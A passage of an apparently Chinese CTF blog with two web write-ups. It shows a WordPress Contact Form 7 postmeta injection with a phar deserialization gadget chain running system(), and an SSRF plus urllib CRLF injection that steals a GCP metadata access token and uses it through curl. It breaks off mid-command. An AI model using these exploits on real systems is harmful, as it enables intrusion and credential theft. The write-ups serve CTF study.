class="string">&#x27;add_post_meta&#x27;</span>, <span class="variable">$post_ID</span>, <span class="variable">$metakey</span> ) ) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$metakey</span> = wp_slash( <span class="variable">$metakey</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> add_post_meta( <span class="variable">$post_ID</span>, <span class="variable">$metakey</span>, <span class="variable">$metavalue</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>但是这里有个is_protected_meta,跟进去发现这个函数限制了我们的键不能以<code>_</code>开头，按照原来的payload，到这里好像死路了。</p>
<p>但是我们跟踪以下插件渲染表单的代码发现</p>
<p>contact-form.php:129</p>
<p>class WPCF7_ContactForm</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$post</span> = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line">		<span class="variable">$post</span> = get_post( <span class="variable">$post</span> );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="variable">$post</span> &amp;&amp; <span class="built_in">self</span>::post_type == get_post_type( <span class="variable">$post</span> ) ) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;id = <span class="variable">$post</span>-&gt;ID;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = <span class="variable">$post</span>-&gt;post_name;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;title = <span class="variable">$post</span>-&gt;post_title;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;locale = get_post_meta( <span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_locale&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">			<span class="variable">$properties</span> = <span class="keyword">$this</span>-&gt;get_properties();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">foreach</span> ( <span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span> ) &#123;</span><br><span class="line">				<span class="keyword">if</span> ( metadata_exists( <span class="string">&#x27;post&#x27;</span>, <span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_&#x27;</span> . <span class="variable">$key</span> ) ) &#123;</span><br><span class="line">					<span class="variable">$properties</span>[<span class="variable">$key</span>] = get_post_meta( <span class="variable">$post</span>-&gt;ID, <span class="string">&#x27;_&#x27;</span> . <span class="variable">$key</span>, <span class="literal">true</span> );</span><br><span class="line">				&#125; <span class="keyword">elseif</span> ( metadata_exists( <span class="string">&#x27;post&#x27;</span>, <span class="variable">$post</span>-&gt;ID, <span class="variable">$key</span> ) ) &#123;</span><br><span class="line">					<span class="variable">$properties</span>[<span class="variable">$key</span>] = get_post_meta( <span class="variable">$post</span>-&gt;ID, <span class="variable">$key</span>, <span class="literal">true</span> );</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">$this</span>-&gt;properties = <span class="variable">$properties</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;upgrade();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		do_action( <span class="string">&#x27;wpcf7_contact_form&#x27;</span>, <span class="keyword">$this</span> );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>contact form 的属性啥的就是从<code>$properties</code>中取出(<code>_mail</code>就在这里面)，想要利用历史漏洞我们必须能够控制<code>_mail</code>的值</p>
<p><code>metadata_exists( &#39;post&#39;, $post-&gt;ID, &#39;_&#39; . $key )</code>:它先会去表中查找<code>&quot;_&quot;.&quot;mail&quot;</code>这个属性，没有的话再去查找<code>&quot;mail&quot;</code>属性，正好我们前面找到一个可以控制非<code>_</code>开头的postmeta</p>
<p>于是构造</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;async&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;crossDomain&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;/wp-admin/post.php?post=1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: <span class="built_in">document</span>.getElementById(<span class="string">&quot;_wpnonce&quot;</span>).value,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;%2Fwp-admin%2Fpost-new.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_ID&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="string">&quot;originalaction&quot;</span>: <span class="string">&quot;editpost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_author&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_type&quot;</span>: <span class="string">&quot;wpcf7_contact_form&quot;</span>,</span><br><span class="line">        <span class="string">&quot;original_post_status&quot;</span>: <span class="string">&quot;auto-draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;auto_draft&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_title&quot;</span>: <span class="string">&quot;readflagtotmp2log&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wp-preview&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mm&quot;</span>: <span class="string">&quot;12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jj&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_thumbnail_id&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;advanced_view&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;comment_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ping_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metakeyinput&quot;</span>:<span class="string">&quot;mail&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[subject]&quot;</span>: <span class="string">&quot;test \&quot;[your-subject]\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[sender]&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[recipient]&quot;</span>: <span class="string">&quot;ccreater@172.16.8.6:60000&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[body]&quot;</span>: <span class="string">&quot;From: [your-name] &lt;[your-email]&gt;\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[additional_headers]&quot;</span>: <span class="string">&quot;Reply-To: [your-email]&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[attachments]&quot;</span>: <span class="string">&quot;phar://./wp-content/uploads/2020/12/phar.jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[use_html]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">        <span class="string">&quot;metavalue[exclude_blank]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">		<span class="string">&quot;metakeyselect&quot;</span>:<span class="string">&quot;#NONE#&quot;</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">jQuery.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在dashboard那里执行这个js</p>
<p>成功写入<code>mail</code>:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201208232404.png" alt="image8421"></p>
<p>因为没有<code>_form</code>属性（上面那个设置postmeta的一次只能设置一个），所以我们要手动提交<code>jQuery(&quot;.wpcf7-form&quot;).submit()</code>，接着就可以读取文件和反序列化了</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Kigkonsult</span>\<span class="title">Icalcreator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Vtimezone</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">timezonetype</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$components</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;components = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="title">require</span>( &#x27;<span class="title">wp</span>-<span class="title">load</span>.<span class="title">php</span>&#x27; );  <span class="comment">//???????</span></span><br><span class="line">	<span class="keyword">require_once</span>( dirname( <span class="keyword">__FILE__</span> ) . <span class="string">&#x27;/wp-includes/Requests/Utility/FilteredIterator.php&#x27;</span> );</span><br><span class="line">	<span class="variable">$arr</span>  = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;1&quot;</span> =&gt; <span class="string">&quot;/readflag&gt;/tmp/2.log&quot;</span>  <span class="comment">//payload</span></span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$obj_</span> = <span class="keyword">new</span> Requests_Utility_FilteredIterator( <span class="variable">$arr</span>, <span class="string">&quot;system&quot;</span> );</span><br><span class="line">	<span class="variable">$obj</span>  = <span class="keyword">new</span> Kigkonsult\Icalcreator\Vtimezone( <span class="variable">$obj_</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	@unlink( <span class="string">&quot;test.gif&quot;</span> );</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> Phar( <span class="string">&quot;test.phar&quot;</span> );</span><br><span class="line">	<span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setStub( base64_decode( <span class="string">&quot;/9j/4AAQSkZJRgABAgEASABIAAD//gARSlBFRyBJbWFnZXIgMi4x/9sAhAAGBAUGBQQGBgUGBwcGCAoQCgoJCQoUDg8MEBcUGBgXFBYWGh0lHxobIxwWFiAsICMmJykqKRkfLTAtKDAlKCkoAQMEBAUE&quot;</span> ) . <span class="string">&quot; __HALT_COMPILER(); ?&gt;&quot;</span> );</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setMetadata( <span class="variable">$obj</span> );</span><br><span class="line">	<span class="variable">$phar</span>-&gt;addFromString( <span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span> ); <span class="comment">//????????</span></span><br><span class="line">	<span class="comment">//??????</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">	rename( <span class="string">&quot;test.phar&quot;</span>, <span class="string">&quot;test.gif&quot;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" data-id="ckw7zwbz2000bfmol3kykhz4v" data-title="2020xnuca_ezwp题解" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020 balsn ctf web 部分题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2020-11-26T16:00:00.000Z" itemprop="datePublished">2020-11-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-BalsnCTF-web-部分题解"><a href="#2020-BalsnCTF-web-部分题解" class="headerlink" title="2020 BalsnCTF web 部分题解"></a>2020 BalsnCTF web 部分题解</h1><p>文章首发于<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222675">安全客</a></p>
<p>题目文件：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ">https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ</a><br>提取码：v7qg </p>
<h2 id="tpc"><a href="#tpc" class="headerlink" title="tpc"></a>tpc</h2><p><a target="_blank" rel="noopener" href="http://35.194.175.80:8000/">http://35.194.175.80:8000/</a></p>
<p>题目说flag就在工作目录下并且不可以暴力猜解出文件名</p>
<p>试着file协议，发现可以任意文件读取，那么我们首先要做的是试着读取源文件</p>
<p>读取/proc/self/cmdline查看启动命令</p>
<p><code>/usr/local/bin/python /usr/local/bin/gunicorn main-dc1e2f5f7a4f359bb5ce1317a:app --bind 0.0.0.0:8000 --workers 5 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -</code></p>
<p>谷歌以下gunicorn的用法很容易知道源文件就是<code>main-dc1e2f5f7a4f359bb5ce1317a.py</code></p>
<p>再读取/proc/self/environ查看环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME=tpc-1PYTHON_PIP_VERSION=19.0.3SHLVL=1HOME=/home/ggGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8PYTHON_VERSION=3.7.2PWD=/opt/workdir</span><br></pre></td></tr></table></figure>

<p>于是就知道源文件在 /opt/workdir/main-dc1e2f5f7a4f359bb5ce1317a.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/query&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    site = request.args.get(<span class="string">&#x27;site&#x27;</span>)</span><br><span class="line">    text = urllib.request.urlopen(site).read()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/query?site=[your website]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>就提供了一个很简单的ssrf功能，那么为了找到下一步的思路，就必须收集更多信息，用字典fuzz一下得到以下关键信息</p>
<p>/proc/1/net/arp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.17.0.4       0x1         0x0         00:00:00:00:00:00     *        docker0</span><br><span class="line">172.17.0.3       0x1         0x0         00:00:00:00:00:00     *        docker0</span><br><span class="line">172.17.0.2       0x1         0x2         02:42:ac:11:00:02     *        docker0</span><br><span class="line">10.140.0.1       0x1         0x2         42:01:0a:8c:00:01     *        eth0</span><br></pre></td></tr></table></figure>

<p>/etc/hosts</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># /etc/hosts: Local Host Database</span><br><span class="line">#</span><br><span class="line"># This file describes a number of aliases-to-address mappings for the for </span><br><span class="line"># local hosts that share this file.</span><br><span class="line">#</span><br><span class="line"># In the presence of the domain name service or NIS, this file may not be </span><br><span class="line"># consulted at all; see /etc/host.conf for the resolution order.</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># IPv4 and IPv6 localhost aliases</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Imaginary network.</span><br><span class="line">#10.0.0.2               myname</span><br><span class="line">#10.0.0.3               myfriend</span><br><span class="line">#</span><br><span class="line"># According to RFC 1918, you can use the following IP networks for private </span><br><span class="line"># nets which will never be connected to the Internet:</span><br><span class="line">#</span><br><span class="line">#       10.0.0.0        -   10.255.255.255</span><br><span class="line">#       172.16.0.0      -   172.31.255.255</span><br><span class="line">#       192.168.0.0     -   192.168.255.255</span><br><span class="line">#</span><br><span class="line"># In case you want to be able to connect directly to the Internet (i.e. not </span><br><span class="line"># behind a NAT, ADSL router, etc...), you need real official assigned </span><br><span class="line"># numbers.  Do not try to invent your own network numbers but instead get one </span><br><span class="line"># from your network provider (if any) or from your regional registry (ARIN, </span><br><span class="line"># APNIC, LACNIC, RIPE NCC, or AfriNIC.)</span><br><span class="line">#</span><br><span class="line">169.254.169.254 metadata.google.internal metadata</span><br></pre></td></tr></table></figure>



<p>hosts文件里面添加了一条特殊的记录，谷歌一下发现里面存放着实例的一些数据</p>
<p>直接访问<code>metadata.google.internal</code>，得到：</p>
<p><code>0.1/ computeMetadata/</code></p>
<p>继续访问下一级目录发现500了</p>
<p>阅读<a target="_blank" rel="noopener" href="https://cloud.google.com/compute/docs/storing-retrieving-metadata#querying">文档</a>得知要加入<code>Metadata-Flavor: Google</code>请求头</p>
<p>python的urlllib库之前爆出存在着CRLF的漏洞，利用这个来绕过</p>
<p><code>&quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal/PATH/%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;</code></p>
<p>写个脚本读取所有数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">parent,path</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal&quot;</span>+parent+path+<span class="string">&quot;%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(burp0_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInfo</span>(<span class="params">parent,path</span>):</span></span><br><span class="line">    r = req(parent,path)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(parent+path)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----------------------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    child = r.text.splitlines()</span><br><span class="line">    parent=parent+path</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> child:</span><br><span class="line">        </span><br><span class="line">        getInfo(parent,i)</span><br><span class="line"></span><br><span class="line">getInfo(parent=<span class="string">&quot;&quot;</span>,path=<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>得到以下数据（只显示对题目有用的数据）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">/computeMetadata/v1/project/project-id</span><br><span class="line">balsn-ctf-2020-tpc</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">/computeMetadata/v1/instance/service-accounts/default/token</span><br><span class="line">&#123;&quot;access_token&quot;:&quot;ya29.c.KpcB5QdRi_ofZUDT6YcnsZrXwex0ocEfddkf1cL9qgsBVUuJI6xm7X__zkSxCc4jbw35HGJ2ZSbVUQljIKqOWbe_-q33It_9ip0sO15lH8usKPuj1I-vg2BHQeyizyWloiDf2vlRbL0EiZNaiKa3_tGFFEbxt9JrmsfYxWoN3_VOn3cqTbjNyEdj3-Xr3oQUiD0ESz0H2NS4Lg&quot;,&quot;expires_in&quot;:3147,&quot;token_type&quot;:&quot;Bearer&quot;&#125;</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">/computeMetadata/v1/instance/service-accounts/default/scopes</span><br><span class="line">https://www.googleapis.com/auth/devstorage.read_only</span><br><span class="line">https://www.googleapis.com/auth/logging.write</span><br><span class="line">https://www.googleapis.com/auth/monitoring.write</span><br><span class="line">https://www.googleapis.com/auth/servicecontrol</span><br><span class="line">https://www.googleapis.com/auth/service.management.readonly</span><br><span class="line">https://www.googleapis.com/auth/trace.append</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<p>阅读<a target="_blank" rel="noopener" href="https://cloud.google.com/storage/docs">文档</a>来了解下载存储在服务器上的数据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查询存储分区：</span></span><br><span class="line">curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \</span><br><span class="line">  &quot;https://storage.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc&quot;</span><br><span class="line"><span class="meta">  </span></span><br><span class="line"><span class="meta">#</span><span class="bash">查询存储对象</span></span><br><span class="line">curl -X GET -H &quot;Authorization: Bearer 